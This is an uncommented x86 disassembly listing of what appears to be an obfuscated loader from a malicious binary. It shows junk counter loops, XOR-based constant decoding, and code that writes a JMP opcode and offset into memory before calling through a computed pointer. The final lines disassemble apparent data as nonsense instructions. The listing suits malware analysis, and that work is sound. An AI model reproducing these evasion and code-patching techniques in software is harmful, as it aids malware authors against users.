  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43371b
  40d8a4:	add    esi,DWORD PTR ds:0x4336e3
  40d8aa:	mov    DWORD PTR ds:0x43371b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433647
  40d8bc:	and    eax,DWORD PTR ds:0x4336af
  40d8c2:	mov    ds:0x433647,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433653,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43375b,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43375b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43375b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43375b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43375b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4336a7,0x43375f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433653
  40d93b:	and    edi,DWORD PTR ds:0x43372f
  40d941:	mov    DWORD PTR ds:0x433653,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4336a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4336a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4336a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4336a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4336a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4336a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4336a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4336a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43364f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4336db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4336f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43369f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43365f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433763,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4336eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43364f
  40da21:	sub    DWORD PTR ds:0x433667,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43365b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43372f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43372f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43372f,ecx
  40da55:	cmp    DWORD PTR ds:0x43372f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43372f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43372f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43372f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43372f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43375b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433697,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433697
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433697,ecx
  40dabd:	cmp    DWORD PTR ds:0x433697,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433697,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433974
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433663,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4336a7,0x43364f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433757,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433643,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433647,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4336cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433663,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43371f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43371f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43371f,ecx
  40db80:	cmp    DWORD PTR ds:0x43371f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43371f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43371f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43369f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433727,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433727,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433727,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433767
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433727,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433727
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433727,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433727
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433727,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433717,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433717
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433717,eax
  40dc3b:	cmp    DWORD PTR ds:0x433717,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433875
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433717,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433717
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433717,eax
  40dc72:	cmp    DWORD PTR ds:0x433717,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43364b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433647,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433773,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43369f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43369f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43369f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43369f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43369f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43369f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43369f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43369f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4336a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433767
  40dd13:	mov    DWORD PTR ds:0x4336a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43376b
  40dd26:	or     DWORD PTR ds:0x43371b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4336b3
  40dd3a:	and    DWORD PTR ds:0x43371f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433657,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43364f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43365b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43376b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43371b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43365b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4336a7,0x43372f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43375f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43369f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43365b,0x43372f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43364b
  40ddeb:	or     DWORD PTR ds:0x4336df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43375b,0x4336b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433763,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4336ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4336ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4336ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4336ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4336ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4336ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433767,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43371b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433757,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433763
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433697,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4336e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433657,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x4336df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43372b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4336af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433717,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433727,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433727
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433727,ecx
  40e244:	cmp    DWORD PTR ds:0x433727,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433727,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433727
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433727,ecx
  40e279:	cmp    DWORD PTR ds:0x433727,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43375b,0x433647
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4336eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4336eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4336eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4336eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433974
  40e2d5:	push   0x433974
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4336eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	lock xor DWORD PTR [esi+edx*8-0x3b],ebx
  40e325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e326:	jl     0x40e3a4
  40e328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e329:	jns    0x40e3a7
  40e32b:	jl     0x40e2dd
  40e32d:	in     al,dx
  40e32e:	xchg   esp,eax
  40e32f:	push   ecx
  40e330:	cwde   
  40e331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
